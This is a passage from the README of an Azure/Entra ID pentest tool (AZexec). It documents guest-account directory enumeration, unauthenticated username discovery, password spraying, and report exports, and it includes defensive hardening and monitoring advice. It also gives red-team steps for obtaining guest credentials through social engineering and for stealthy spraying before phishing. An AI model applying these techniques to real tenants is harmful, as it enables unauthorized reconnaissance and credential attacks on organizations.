- **Severity**: Medium (may expose internal infrastructure or enable redirect attacks)

#### Implicit Flow Enabled
- **What**: The OAuth implicit flow is supported (returns tokens in URL fragments)
- **Risk**: Tokens in URLs can be logged, leaked via referrer headers, or stolen via XSS
- **Recommendation**: Modern applications should use Authorization Code flow with PKCE
- **Severity**: Medium (security consideration for modern apps)

#### Risky Grant Types

**Password Grant (Resource Owner Password Credentials)**:
- **What**: Allows applications to collect user passwords directly
- **Risk**: Defeats MFA, password policies, and creates credential theft opportunities
- **Recommendation**: Should only be used for legacy systems during migration
- **Severity**: High

**Client Credentials Grant**:
- **What**: Application-only authentication without user context
- **Risk**: If client secret is compromised, attackers gain application-level access
- **Recommendation**: Use certificate-based authentication and rotate secrets regularly
- **Severity**: Medium (requires proper secret management)

#### Accessible Federation Metadata
- **What**: Publicly accessible federation configuration XML
- **Risk**: Reveals federation partners, entity IDs, and authentication endpoints
- **Severity**: Low (informational for reconnaissance)

### When to Be Concerned

🔴 **High Priority**:
- Password grant type enabled
- Redirect URIs pointing to non-HTTPS endpoints
- Wildcard redirect URIs (e.g., `https://*.example.com/*`)

🟡 **Medium Priority**:
- Implicit flow enabled for new applications
- Client credentials without proper rotation
- Exposed internal application URLs

🟢 **Low Priority / Informational**:
- Federation metadata available (expected for federated tenants)
- Standard OpenID configuration exposure (normal)
- Common grant types like authorization_code

## 🔓 Guest User Enumeration - The Azure "Null Session"

> **⚠️ CRITICAL SECURITY FINDING**: This is one of the most underestimated attack vectors in Azure/Entra ID. Most organizations are vulnerable and don't even know it.

### Understanding the Azure Null Session Equivalent

**Critical Security Finding**: Guest users in Azure/Entra ID represent the modern equivalent of SMB null sessions - a low-privileged account that can often enumerate significant directory information due to misconfigured default permissions.

**TL;DR for Pentesters:**
- Get invited as a guest (or compromise a vendor/partner account)
- Run `.\azx.ps1 hosts` with guest credentials
- Enumerate entire directory with minimal detection
- Profit 💰

### The Attack Vector

In classic on-premises Active Directory penetration testing, attackers would use **null session** (anonymous) connections to enumerate users, groups, and shares via SMB. In Azure/Entra ID, **guest accounts** serve a similar purpose:

```
Traditional Attack:        Modern Azure Equivalent:
┌─────────────────┐       ┌──────────────────────┐
│  SMB Null       │       │  Guest User Account  │
│  Session        │  ───> │  (External B2B)      │
│  (Anonymous)    │       │                      │
└─────────────────┘       └──────────────────────┘
         ↓                            ↓
    Enumerate:                   Enumerate:
    - Users                      - Users
    - Groups                     - Groups
    - Shares                     - Devices
    - Computers                  - Applications
                                 - Service Principals
```

### Access Level Comparison

| Access Level | Authentication Required | Enumeration Capabilities | Detection Risk | Use Case |
|-------------|------------------------|-------------------------|----------------|----------|
| **No Authentication** | ❌ None | Tenant config, username validation, federation metadata | 🟢 **None** | Initial reconnaissance |
| **Guest User** | ✅ Guest credentials | Users, groups, devices, some apps (if not restricted) | 🟡 **Low** | **"Null session"** - Primary enumeration method |
| **Member User** | ✅ Member credentials | Full directory, all devices, groups, apps, policies | 🔴 **High** | Post-compromise enumeration |
| **Global Admin** | ✅ Admin credentials | Everything including security settings, CA policies | 🔴 **Critical** | Full tenant control |

**Key Takeaway**: Guest user access provides **80% of the information** with **20% of the risk** - making it the optimal reconnaissance method.

### Why This Works

**Default Azure/Entra ID Guest Permissions:**
When external collaboration is enabled (which it is in most organizations), guest users receive the following default permissions:

1. **User.Read.All** - Read all users' basic profiles
2. **Group.Read.All** - Read all group information
3. **Device.Read.All** - Read all device information (often enabled)
4. **Directory.Read.All** - Read directory data (depending on configuration)

**The Problem:**
- Most organizations enable external collaboration for business needs (partners, vendors, contractors)
- Default guest permissions are often **NOT** restricted
- Organizations don't realize guests can enumerate the entire directory
- Guest access generates **minimal logs and alerts** compared to compromised member accounts
- This is a **low-noise reconnaissance technique** perfect for initial access scenarios

### Testing for Guest Enumeration Vulnerability

#### Step 1: Check if the Organization Has Guest Users

```powershell
# Enumerate from outside (no authentication required)
.\azx.ps1 tenant -Domain target.com

# Look for:
# - External collaboration enabled
# - B2B integration settings
# - Guest user access restrictions
```

#### Step 2: Obtain Guest Access (Red Team Scenarios)

Common methods to obtain guest credentials:
1. **Social Engineering**: Request access as a "vendor" or "partner"
2. **Compromised Partner**: Use credentials from a compromised partner organization
3. **Open Registrations**: Some orgs have self-service guest registration
4. **Leaked Credentials**: Guest accounts in breach databases
5. **Business Email**: Create legitimate business relationship requiring collaboration

#### Step 3: Enumerate as Guest User

Once you have guest credentials (e.g., `external-user@partner.com`):

```powershell
# Connect as guest user
Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Device.Read.All"
# (Login with guest credentials when prompted)

# Enumerate all users in the target tenant
.\azx.ps1 hosts -Scopes "User.Read.All,Device.Read.All"

# Check what you can access with the new commands
.\azx.ps1 hosts
.\azx.ps1 groups
.\azx.ps1 pass-pol

# Or use Graph API directly
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, JobTitle, Department
Get-MgGroup -All | Select-Object DisplayName, Description
Get-MgDevice -All | Select-Object DisplayName, OperatingSystem
```

### Example Attack Flow

```powershell
# 1. Initial reconnaissance (no auth)
.\azx.ps1 tenant -Domain targetcorp.com -ExportPath tenant-info.json
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv

# 2. Obtain guest access (assume you now have guest credentials)
# Login as: compromised-vendor@partner.com

# 3. Enumerate as guest (low-noise reconnaissance)
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 pass-pol -ExportPath policy.json

# Result: Complete tenant inventory without triggering high-severity alerts
```

### What Can Guest Users Typically Enumerate?

With default guest permissions, you can often access:

✅ **Users**
- Display names, email addresses, job titles
- Department and office location
- Manager relationships
- Photos and profile information

✅ **Groups** (use `.\azx.ps1 groups`)
- Group names and descriptions
- Group membership (often)
- Distribution lists
- Microsoft Teams teams
- Security groups and mail-enabled groups
- Group types and creation dates

✅ **Devices** (use `.\azx.ps1 hosts`)
- Device names and IDs
- Operating systems and versions
- Compliance status
- Trust type (Azure AD joined, Hybrid)
- Last sign-in times
- Device owners (with `-ShowOwners` flag)

✅ **Applications**
- Registered applications
- Service principals
- OAuth permissions granted
- Redirect URIs

🟡 **Password Policies** (use `.\azx.ps1 pass-pol` - limited for guests)
- Password expiration settings (often visible)
- Domain configuration (often visible)
- Authentication methods (may be visible)
- Security Defaults status (often restricted)
- **Conditional Access Policies (usually restricted)**

❌ **What's Usually Restricted for Guests:**
- Conditional access policies (admin/member only)
- Full security defaults settings
- Most privileged role assignments
- Certain sensitive user attributes
- Detailed policy configurations
- Security posture details

### Defensive Recommendations

Organizations should **immediately** review and restrict guest user permissions:

#### 1. Review External Collaboration Settings
```powershell
# Check current guest settings
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty GuestUserRoleId
```

#### 2. Restrict Guest Permissions (Recommended)
- **Navigate to**: Azure Portal → Entra ID → Users → User settings → External users
- **Set**: "Guest user access restrictions" to **"Guest users have limited access to properties and memberships of directory objects"** (most restrictive)

#### 3. Monitor Guest Activity
- Enable guest user sign-in logs
- Alert on guest users accessing Microsoft Graph API
- Review guest users regularly and remove unused accounts

#### 4. Conditional Access for Guests
- Require MFA for all guest users
- Restrict guest access to specific applications
- Block guest access from untrusted locations

#### 5. Regular Audits
```powershell
# List all guest users
Get-MgUser -Filter "userType eq 'Guest'" | Select-Object DisplayName, UserPrincipalName, CreatedDateTime

# Check guest permissions
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'guest-user-id'"
```

### Detection and Monitoring

**Log Sources to Monitor:**
- **Azure AD Sign-in Logs**: Guest user authentication events
- **Audit Logs**: Guest user enumeration via Microsoft Graph
- **Microsoft Graph API Logs**: High volume of read requests from guest users

**Suspicious Indicators:**
- Guest user enumerating large numbers of users/devices/groups
- Guest user accessing Microsoft Graph API outside business hours
- Guest user with newly created account performing enumeration
- Multiple failed Graph API calls followed by successful enumeration

### Why This is Critical

🔴 **High Impact**:
- Complete directory enumeration with minimal privileges
- Low detection rate compared to compromised member accounts
- Perfect for initial reconnaissance in red team operations
- Can identify high-value targets for further attacks

🟡 **Common Misconfiguration**:
- Default settings favor collaboration over security
- Most organizations are **unaware** of guest enumeration capabilities
- Rarely monitored or audited

🔐 **Mitigation Priority**:
- **Immediate**: Review and restrict guest permissions
- **Short-term**: Implement monitoring for guest activity
- **Long-term**: Regular audits and least-privilege access model

### Quick Vulnerability Check

**For Defenders - Check if Your Org is Vulnerable:**
```powershell
# 1. Check external collaboration settings
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty GuestUserRoleId

# 2. List all guest users
Get-MgUser -Filter "userType eq 'Guest'" | Measure-Object

# 3. Test what guests can see (safe - read-only)
# Login as a test guest account and run:
Get-MgUser -Top 10  # If this works, you're vulnerable
Get-MgDevice -Top 10  # If this works, you're VERY vulnerable
```

**Guest User Role IDs:**
- `a0b1b346-4d3e-4e8b-98f8-753987be4970` = **VULNERABLE** (Guest users have the same access as member users)
- `10dae51f-b6af-4016-8d66-8c2a99b929b3` = **LIMITED** (Guests have limited access - still allows some enumeration)
- `2af84b1e-32c8-42b7-82bc-daa82404023b` = **RESTRICTED** (Most restrictive - recommended)

**For Red Teamers - Quick Win Checklist:**
- [ ] Obtain guest credentials (social engineering, compromised partner, etc.)
- [ ] Run `.\azx.ps1 hosts` with guest creds
- [ ] If successful, run with `-ShowOwners -ExportPath loot.json`
- [ ] Enumerate users: `Get-MgUser -All`
- [ ] Enumerate groups: `Get-MgGroup -All`
- [ ] Identify high-value targets (admins, executives)
- [ ] Pivot to targeted phishing or credential attacks

## 🔐 Authentication

### Username Enumeration (No Authentication Required)
The `users` command uses the public GetCredentialType API endpoint and does not require authentication. This makes it perfect for:
- Initial reconnaissance and user discovery
- Validating email addresses before phishing campaigns (for authorized red team operations)
- User enumeration during penetration tests
- Identifying valid usernames for password spraying attacks (authorized only)

**How it Works:**
The tool queries `https://login.microsoftonline.com/common/GetCredentialType` which is a public endpoint used by Microsoft login pages to determine the authentication method for a username. The API returns:
- `IfExistsResult: 0` - User exists (Managed/Cloud authentication)
- `IfExistsResult: 1` - User does not exist
- `IfExistsResult: 5` - User exists (Alternate authentication)
- `IfExistsResult: 6` - User exists (Federated authentication)

**Domain Auto-Detection:**
If you don't specify a domain with `-Domain`, the tool will automatically attempt to detect your current user's domain from:
- User Principal Name (UPN) via `whoami /upn` (Windows)
- Environment variable `USERDNSDOMAIN`
- Current user's Windows identity

This allows you to quickly run `.\azx.ps1 users -CommonUsernames` without specifying a domain.

**Input Methods:**
1. **Single Username**: Check one specific username
2. **File Input**: Read usernames from a text file (one per line, comments starting with # are ignored)
3. **Common Usernames**: Use built-in list of common usernames (admin, administrator, support, helpdesk, etc.)

**Enhanced Features (v2.0):**
- **Progress Tracking**: Real-time progress bar for large lists (>10 users) with ETA
- **Retry Logic**: Automatic retries with exponential backoff (100ms → 200ms → 400ms)
- **Adaptive Rate Limiting**: Smart delays based on list size
  - Small (<50 users): 50ms delay - fast enumeration
  - Medium (50-200 users): 100ms delay - balanced approach
  - Large (>200 users): 150ms delay - stealth-focused
- **Detailed Statistics**: Duration tracking, rate calculation (checks/sec), auth type breakdown
- **Error Tracking**: Separates network failures from invalid usernames
- **Next Steps Guidance**: Automatic commands for Phase 2 password spraying

**Performance:**
- Small lists: ~1-2 seconds per user
- Large lists: ~3-4 seconds per user  
- Example: 500 usernames ≈ 100 seconds (~5 users/sec)

### Tenant Discovery (No Authentication Required)
The `tenant` command uses public OpenID configuration endpoints and does not require authentication. This makes it perfect for reconnaissance and initial discovery.

**Enhanced Enumeration**: The tool now performs comprehensive tenant reconnaissance similar to `nxc smb --enum`, including:
- **OpenID Configuration Analysis**: Queries both tenant-specific and common v2.0 OpenID endpoints
- **Exposed Application Discovery**: Identifies publicly accessible application IDs and client configurations
- **Redirect URI Enumeration**: Detects exposed redirect URIs that may indicate misconfigured applications
- **OAuth Misconfiguration Detection**: Flags potential security risks including:
  - Implicit flow configurations (security consideration for modern applications)
  - Risky grant types (password, client_credentials)
  - Publicly accessible federation metadata
- **Federation Metadata**: For federated tenants, attempts to retrieve and parse federation metadata XML
- **Endpoint Probing**: Checks for accessible Microsoft Graph and Azure Management endpoints

**What Gets Enumerated**:
1. **Standard OpenID Configuration**: Tenant ID, issuer, authorization/token endpoints, JWKS URI
2. **Security Posture**: Response types, grant types, supported scopes and claims
3. **Application Exposure**: App IDs, redirect URIs, and client configurations that are publicly accessible
4. **Federation Details**: Entity IDs and federation endpoints for federated authentication
5. **Misconfigurations**: Potentially risky OAuth/OIDC configurations that may indicate security weaknesses

**Auto-Detection Feature**: If you don't specify a domain, the tool will automatically attempt to detect your current user's domain from:
- User Principal Name (UPN) via `whoami /upn` (Windows)
- Environment variable `USERDNSDOMAIN`
- Current user's Windows identity

This allows you to quickly run `.\azx.ps1 tenant` without specifying a domain.

### Device Enumeration (Authentication Required)
On first run of the `hosts` command, the script will:
1. Check for the Microsoft.Graph module (install if missing)
2. Prompt for Microsoft Graph authentication
3. Request necessary permissions (Device.Read.All by default)
4. Cache credentials for subsequent runs

**Using Guest Credentials for Low-Noise Enumeration:**
```powershell
# Method 1: Interactive guest login
Disconnect-MgGraph
.\azx.ps1 hosts
# (Enter guest credentials when prompted: external-user@partner.com)

# Method 2: Explicitly specify scopes
.\azx.ps1 hosts -Scopes "User.Read.All,Group.Read.All,Device.Read.All"

# Method 3: Use guest credentials with additional enumeration
Connect-MgGraph -Scopes "User.Read.All","Device.Read.All"
.\azx.ps1 hosts -ShowOwners -ExportPath guest-enum.json
```

To switch accounts or tenants:
```powershell
Disconnect-MgGraph
.\azx.ps1 hosts
```

## 📁 Export Formats

### Username Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath users.csv
```
Includes: Username, Exists (True/False), IfExistsResult (numeric code), AuthType (Managed/Federated/Alternate), ThrottleStatus

#### JSON Export (Recommended for automation)
```powershell
.\azx.ps1 users -Domain example.com -UserFile users.txt -ExportPath results.json
```
Structured JSON with all response details including throttle status and full API response data

### User Profile Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
```
Includes: UserId, DisplayName, UserPrincipalName, Mail, JobTitle, Department, OfficeLocation, UserType, AccountEnabled, LastSignInDateTime

#### JSON Export (Recommended)
```powershell
.\azx.ps1 user-profiles -ExportPath users.json
```
Structured JSON with all user profile properties including sign-in activity

### Tenant Discovery Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant.json
```
Includes: Domain, TenantId, Issuer, all endpoints, federation status, supported response types, scopes, claims, **exposed applications**, **redirect URIs**, **potential misconfigurations**, and full OpenID configuration

#### CSV Export
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant.csv
```
Includes: Domain, TenantId, Issuer, endpoints, and federation status (simplified view - JSON recommended for full security findings)

### Device Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 hosts -ExportPath output.csv
```
Includes: DeviceId, DisplayName, OperatingSystem, OperatingSystemVersion, TrustType, IsCompliant, AccountEnabled, ApproximateLastSignInDateTime, RegisteredOwners

#### JSON Export
```powershell
.\azx.ps1 hosts -ExportPath output.json
```
Structured JSON with all device properties

### Group Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 groups -ExportPath groups.csv
```
Includes: GroupId, DisplayName, Description, GroupTypes, SecurityEnabled, MailEnabled, Mail, MailNickname, CreatedDateTime, MemberCount

#### JSON Export (Recommended)
```powershell
.\azx.ps1 groups -ExportPath groups.json
```
Structured JSON with all group properties and detailed information

### Password Policy Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 pass-pol -ExportPath policy.json
```
Includes: TenantId, TenantDisplayName, PasswordPolicies (ValidityPeriodDays, NotificationWindowDays), SecurityDefaults (enabled/disabled), ConditionalAccessPolicies (full list), AuthenticationMethods (enabled methods)

### Application Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 apps -ExportPath apps.csv
```
Includes: Type (Application/ServicePrincipal), ObjectId, AppId, DisplayName, SignInAudience, IsFallbackPublicClient, PasswordCredentials (count), KeyCredentials (count), CreatedDateTime, PublicClientRedirectUris, WebRedirectUris

#### JSON Export (Recommended)
```powershell
.\azx.ps1 apps -ExportPath apps.json
```
Structured JSON with all application and service principal properties including:
- Full credential information (counts and types)
- Redirect URIs (both web and public client)
- Service principal type and enabled status
- Tags and additional metadata

**Use Cases:**
- Security audits: Identify password-only credentials
- Compliance: Track application registrations and their authentication methods
- Vulnerability assessment: Find ROPC-enabled applications (publicClient = True)
- Credential management: Track expiring credentials (combine with vuln-list command)

#### CSV Export (Simplified)
```powershell
.\azx.ps1 pass-pol -ExportPath policy.csv
```
Includes: TenantId, TenantDisplayName, PasswordValidityDays, PasswordNotificationDays, SecurityDefaultsEnabled, ConditionalAccessPolicyCount (flattened structure)

### Guest Login Enumeration Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123' -ExportPath spray.json
```
Includes: Domain, TenantConfig (NameSpaceType, FederationType, AcceptsExternalUsers), AuthResults (per-user results with Success, MFARequired, ErrorCode), Summary (counts)

#### CSV Export
```powershell
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123' -ExportPath spray.csv
```
Includes: Username, Password, Success, MFARequired, ConsentRequired, ErrorCode, HasToken (one row per tested credential)

## 📊 HTML Report Generation

AZexec now supports **comprehensive HTML report generation** with a netexec-inspired dark theme. HTML reports provide a professional, shareable format perfect for documentation, presentations, and security assessments.

### Features

- **🎨 NetExec-Style Dark Theme**: Hacker-inspired green-on-black aesthetic
- **📈 Interactive Statistics**: Key metrics and summaries at a glance
- **🔴 Risk Highlighting**: Automatic color-coding for high/medium/low risk items
- **📱 Responsive Design**: Works on any device or screen size
- **🖨️ Print-Friendly**: Optimized for PDF generation and printing
- **📋 Complete Data Tables**: All enumeration results in sortable, filterable tables

### Generating HTML Reports

Simply change the file extension from `.csv` or `.json` to `.html`:

```powershell
# Device enumeration HTML report
.\azx.ps1 hosts -ExportPath devices.html

# User profiles HTML report
.\azx.ps1 user-profiles -ExportPath users.html

# RID bruteforce HTML report (Azure equivalent)
.\azx.ps1 rid-brute -ExportPath users-rid-brute.html

# Service principal discovery HTML report
.\azx.ps1 sp-discovery -ExportPath service-principals.html

# Role assignments HTML report
.\azx.ps1 roles -ExportPath role-assignments.html

# Active sessions HTML report
.\azx.ps1 sessions -ExportPath sessions.html

# Password policy HTML report
.\azx.ps1 pass-pol -ExportPath policies.html

# Group enumeration HTML report
.\azx.ps1 groups -ExportPath groups.html

# Username enumeration HTML report
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.html

# Application enumeration HTML report
.\azx.ps1 apps -ExportPath applications.html
```

### HTML Report Contents

Each HTML report includes:

1. **Header Section**
   - Report title with AZexec branding
   - Command executed
   - Generation timestamp
   - Total record count

2. **Statistics Dashboard**
   - Key metrics displayed as cards
   - Risk-based color coding (red/yellow/green)
   - Command-specific statistics
   - Visual indicators for high-risk findings

3. **Description Section**
   - Command purpose and context
   - What the report contains
   - Key security considerations

4. **Data Table**
   - Complete enumeration results
   - Color-coded cells for risk levels
   - Boolean values displayed as badges
   - Sortable columns (when viewed in browser)
   - Responsive design for mobile/tablet

5. **Footer**
   - AZexec attribution
   - GitHub repository link
   - EvilMist toolkit branding

### Example Use Cases

#### Security Assessment Reports
Generate professional reports for client deliverables:
```powershell
# Comprehensive privileged access review
.\azx.ps1 roles -ExportPath "2025-01-ClientName-PrivilegedAccess-Review.html"
.\azx.ps1 sp-discovery -ExportPath "2025-01-ClientName-ServicePrincipals.html"
.\azx.ps1 ca-policies -ExportPath "2025-01-ClientName-ConditionalAccess.html"
```

#### Red Team Documentation
Document enumeration findings in a shareable format:
```powershell
# Phase 1: External reconnaissance
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath "Phase1-ValidUsers.html"

# Phase 2: Post-authentication enumeration  
.\azx.ps1 hosts -ExportPath "Phase2-Devices.html"
.\azx.ps1 groups -ExportPath "Phase2-Groups.html"
.\azx.ps1 vuln-list -ExportPath "Phase2-Vulnerabilities.html"
```

#### Compliance Audits
Create formatted reports for compliance reviews:
```powershell
.\azx.ps1 pass-pol -ExportPath "Compliance-PasswordPolicies.html"
.\azx.ps1 roles -ExportPath "Compliance-PrivilegedAccounts.html"
.\azx.ps1 sessions -Hours 168 -ExportPath "Compliance-SignInActivity-7Days.html"
```

### Viewing HTML Reports

1. **Web Browser**: Simply double-click the `.html` file to open in your default browser
2. **Export to PDF**: Use browser print functionality (Ctrl+P) and select "Save as PDF"
3. **Share**: Send HTML file via email or upload to documentation platforms
4. **Archive**: Store alongside CSV/JSON exports for complete documentation

### Risk Color Coding

HTML reports automatically highlight security-critical findings:

| Color | Meaning | Examples |
|-------|---------|----------|
| 🔴 **Red** | **HIGH RISK** | Privileged roles, high-risk permissions, critical vulns |
| 🟡 **Yellow** | **MEDIUM RISK** | Password-only auth, ROPC-enabled apps, warnings |
| 🟢 **Green** | **NORMAL** | Standard users, certificate auth, compliant configs |
| 🔵 **Cyan** | **INFO** | General information, standard data |
| ⚪ **Gray** | **LOW/DISABLED** | Disabled accounts, inactive items |

### Combining Export Formats

Generate multiple formats for different use cases:
```powershell
# CSV for spreadsheet analysis
.\azx.ps1 hosts -ExportPath devices.csv

# JSON for automation/parsing
.\azx.ps1 hosts -ExportPath devices.json

# HTML for reporting and documentation
.\azx.ps1 hosts -ExportPath devices.html
```

### Command-Specific Report Examples

#### Device Enumeration Report
```powershell
.\azx.ps1 hosts -Filter windows -ShowOwners -ExportPath windows-devices.html
```
**Statistics Included:**
- Total Devices
- Windows Devices  
- Azure Entra ID Joined
- Hybrid Joined
- Compliant Devices
- Enabled Devices

#### Service Principal Discovery Report
```powershell
.\azx.ps1 sp-discovery -ExportPath sp-analysis.html
```
**Statistics Included:**
- Total Service Principals
- Enabled Service Principals
- **Password-Only SPNs (HIGH RISK)** ← Highlighted in red
- SPNs with App Role Assignments
- Managed Identities
- OAuth2 Permission Grants

#### Role Assignment Report
```powershell
.\azx.ps1 roles -ExportPath role-audit.html
```
**Statistics Included:**
- Total Active Directory Roles
- Total Role Assignments
- **Privileged Role Assignments (HIGH RISK)** ← Highlighted in red
- User Assignments
- Group Assignments
- Service Principal Assignments
- PIM Eligible Assignments

#### Session Enumeration Report
```powershell
.\azx.ps1 sessions -Hours 24 -ExportPath active-sessions.html
```
**Statistics Included:**
- Total Sign-in Events
- Unique Users
- Successful Sign-ins
- Failed Sign-ins
- **Risky Sign-ins (HIGH RISK)** ← Highlighted in red
- MFA Required Sign-ins
- Time Range (Hours)

### Best Practices

1. **Use Descriptive Filenames**: Include date, client name, and content type
   ```powershell
   .\azx.ps1 roles -ExportPath "2025-01-15_ContosoCorp_PrivilegedRoles.html"
   ```

2. **Generate Multiple Formats**: Keep CSV/JSON for data processing, HTML for reporting
   ```powershell
   .\azx.ps1 sp-discovery -ExportPath spns.json
   .\azx.ps1 sp-discovery -ExportPath spns.html
   ```

3. **Archive Reports**: Store HTML reports alongside other documentation
   ```powershell
   $date = Get-Date -Format "yyyy-MM-dd"
   .\azx.ps1 vuln-list -ExportPath "reports/$date-vulnerabilities.html"
   ```

4. **Review in Browser**: HTML reports are best viewed in modern browsers (Chrome, Edge, Firefox)

5. **Convert to PDF**: Use browser print-to-PDF for permanent archival
   ```
   Open .html → Press Ctrl+P → Destination: Save as PDF
   ```

## 🛠️ Troubleshooting

### Guest User Enumeration Issues

#### "Insufficient privileges to complete the operation" (as guest)
- The organization HAS restricted guest permissions (good security!)
- Guest users cannot access the requested resource
- This means the org is **not vulnerable** to guest enumeration
- Try with lower scopes: `-Scopes "User.Read"`

#### Guest Login Successful But No Enumeration Allowed
This is the **desired security posture**. It means:
- External collaboration is enabled (guests can sign in)
- But guest permissions are properly restricted
- The organization has followed security best practices

#### "Access Denied" for Device Enumeration as Guest
- This is normal and expected in **properly configured** tenants
- Most organizations restrict Device.Read.All from guests
- Try user/group enumeration which is more commonly allowed:
```powershell
Get-MgUser -All
Get-MgGroup -All
```

#### How to Tell if an Org is Vulnerable to Guest Enumeration
Look for these indicators:
1. ✅ Guest login successful
2. ✅ Can enumerate users/devices without errors
3. ✅ Can see detailed properties (job titles, departments, etc.)
4. ✅ Can see group memberships
5. ❌ If you get "Access Denied" = org is properly secured

### Guest Login Enumeration Issues

#### "ROPC disabled (try device code flow)"
- The organization has disabled Resource Owner Password Credential (ROPC) flow
- This is a **good security practice** that prevents password spray attacks via this method
- Try using device code flow or interactive authentication instead
- The target organization has security controls in place

#### "Invalid credentials" for all users
- Verify the domain is correct
- Check if usernames require the full UPN format (`user@domain.com`)
- The passwords may genuinely be incorrect
- ROPC may be blocked by Conditional Access policies

#### "MFA Required" for valid credentials
- This is a **successful credential test** - the password is correct!
- MFA is blocking the login, but credentials are valid
- This indicates the account is protected by MFA (good for the target)
- For red team: note these as "valid creds with MFA" for further analysis

#### "Account Locked" messages
- Too many failed authentication attempts have locked the account
- Be careful with password spray - implement proper delays
- This may indicate security controls or previous attack activity
- Wait before retrying to avoid permanent lockout

#### "Tenant not found or not accessible"
- Verify the domain spelling
- Try using the `.onmicrosoft.com` domain variant
- The domain may not be an Azure/Entra tenant

### Username Enumeration Issues

#### "Please provide one of: -Username, -UserFile, or -CommonUsernames"
- You must specify at least one input method for usernames
- Use `-Username` for single user, `-UserFile` for file input, or `-CommonUsernames` for common names
- Domain can be omitted and will be auto-detected from your current user context

#### Rate Limiting / Throttling
- The GetCredentialType API may throttle requests if too many are made too quickly
- The tool includes a 50ms delay between requests
- If you encounter throttling, try checking smaller batches of usernames
- The `ThrottleStatus` field in the response indicates if throttling is occurring

#### "User file not found"
- Verify the path to your username file is correct
- Use absolute paths or paths relative to the current directory

#### No Valid Usernames Found
- This is expected behavior if the usernames don't exist in the tenant
- Verify you're using the correct domain name (or let it auto-detect)
- Try the `-CommonUsernames` flag to test with known common usernames
- Check if the domain is correct using: `.\azx.ps1 tenant -Domain example.com`

#### "Could not auto-detect domain"
- The tool couldn't automatically determine your domain
- Manually specify the domain using: `-Domain example.com`
- Ensure you're logged in with a domain account (not a local account)

### Tenant Discovery Issues

#### "Failed to retrieve tenant configuration"
- Verify the domain name is correct
- Ensure you have internet connectivity
- Check if the domain is actually an Azure/Entra tenant
- Some domains may not have public OpenID configuration endpoints

#### "The specified domain does not appear to be a valid Azure/Entra tenant"
- Verify the domain spelling
- Try using the .onmicrosoft.com domain variant
- The domain may not be federated with Azure/Entra ID

#### "Could not auto-detect domain"
- The tool couldn't automatically determine your domain
- Manually specify the domain using: `.\azx.ps1 tenant -Domain example.com`
- Ensure you're logged in with a domain account (not a local account)

### Device Enumeration Issues

#### "Microsoft.Graph module not found"
The script will automatically install the module. If installation fails:
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser -Force
```

#### "Failed to connect to Microsoft Graph"
- Ensure you have internet connectivity
- Check if your organization allows Microsoft Graph API access
- Verify you have the necessary Azure/Entra ID permissions

#### "No devices found"
- Verify your account has Device.Read.All permissions
- Check if your filter criteria is too restrictive
- Ensure devices exist in the tenant

#### Permission Issues
If you encounter permission errors:
1. Request Device.Read.All permissions from your Azure AD administrator
2. For owner enumeration, you may need Directory.Read.All permissions

### Group Enumeration Issues

#### "Failed to retrieve groups"
- Verify your account has Group.Read.All or Directory.Read.All permissions
- Guest users may have restricted access to group enumeration
- Check if your organization restricts guest user permissions

#### "No groups found or insufficient permissions"
- This may indicate proper security configuration (guest users restricted)
- Try with a member account to confirm groups exist
- Check guest permission settings in Azure AD

#### "Insufficient privileges to complete the operation" (as guest)
- The organization has properly restricted guest permissions (good security!)
- Guest users cannot access group information
- This is the **recommended** security posture
- You may be able to see groups with lower scopes or as a member user

#### Slow Group Enumeration
- Using `-ShowOwners` flag makes additional API calls for each group
- For large organizations, this can take significant time

### Application Enumeration Issues

#### "Failed to retrieve applications"
- Verify your account has Application.Read.All or Directory.Read.All permissions
- Guest users may have restricted access to application enumeration
- Check if your organization restricts guest user permissions to applications

#### "No applications found or insufficient permissions"
- This may indicate restricted guest permissions (good security practice)
- Try with a member account to confirm applications exist
- Some organizations hide application registrations from non-admin users

#### Permission Requirements
For full application enumeration, you need:
- **Application.Read.All**: Read all application registrations and service principals
- **Directory.Read.All**: Read directory data (alternative permission)
- Guest users typically need explicit permission grants for application access

#### Interpreting Results
- **Yellow entries**: Password-only credentials or ROPC-enabled (security risk)
- **Green entries**: Certificate-based authentication (secure configuration)

### Service Principal Discovery Issues

#### "Failed to retrieve service principals"
- Verify your account has Application.Read.All or Directory.Read.All permissions
- Guest users may have restricted access to service principal enumeration
- Check if your organization restricts guest user permissions to service principals

#### "Failed to retrieve app role assignments" or "Failed to retrieve OAuth2 permission grants"
- The command will continue with limited permission data
- For full permission discovery, you need:
  - **Application.Read.All**: Required for reading service principals and applications
  - **Directory.Read.All**: Required for reading directory data
  - **AppRoleAssignment.ReadWrite.All**: Optional (use `-IncludeWritePermissions` flag if needed)
    - Note: Script only performs read operations; this permission is typically unnecessary
- Some organizations restrict access to permission grant information

#### "No service principals found or insufficient permissions"
- This may indicate restricted guest permissions (good security practice)
- Try with a member account to confirm service principals exist
- Some organizations hide service principals from non-admin users

#### Permission Requirements
For full service principal discovery, you need:
- **Application.Read.All**: Read all service principals and applications (required)
- **Directory.Read.All**: Read directory data (required)
- **AppRoleAssignment.ReadWrite.All**: Optional write permission (use `-IncludeWritePermissions` flag)
  - Script only performs read operations; this permission is typically unnecessary
  - By default, only read permissions are requested (principle of least privilege)
- Guest users typically need explicit permission grants for service principal access

#### Interpreting Results
